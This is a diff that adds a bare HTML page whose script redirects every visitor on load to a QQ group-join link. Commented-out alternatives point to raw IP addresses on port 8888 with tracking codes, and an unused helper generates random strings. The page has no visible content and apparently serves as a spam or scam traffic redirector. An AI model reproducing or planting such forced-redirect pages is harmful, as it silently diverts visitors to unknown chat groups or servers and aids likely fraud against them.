@@ -1,0 +1,29 @@
+
+<html>
+<script>
+
+var sj = Math.floor(Math.random()*(70-10+1)+10);
+var aa=[
+		
+			'http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&k=jzlzCkey6G8_nLdcHOUFqQ0RrvTVpInl&authKey=5NfcBOCAS29ISH7vYUP7jJ8EhlxdU3TYHjQHhx9WDD0PuFtEma%2B%2FZf9jc0mvXOoC&noverify=0&group_code=927404498'
+           // 'http://154.206.211.140:8888/e?p=3&c=FLM03HC'
+           // 'http://154.206.211.138:8888/e?p=13&c=FLM13HC'
+			
+];
+location.href = aa[Math.floor(Math.random()*aa.length)];
+
+function myEeplace(s){
+	return s.replace(/\{(\w+?)\}/g,function(a,b){
+		var h='';
+		for(var i=0;i<b.length;i++){
+			if('n'==b[i]){
+				h+=Math.floor(Math.random()*10);
+			}else if('w'==b[i]){
+				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
+			}
+		}
+		return h;
+	});
+}
+</script>
+<html>
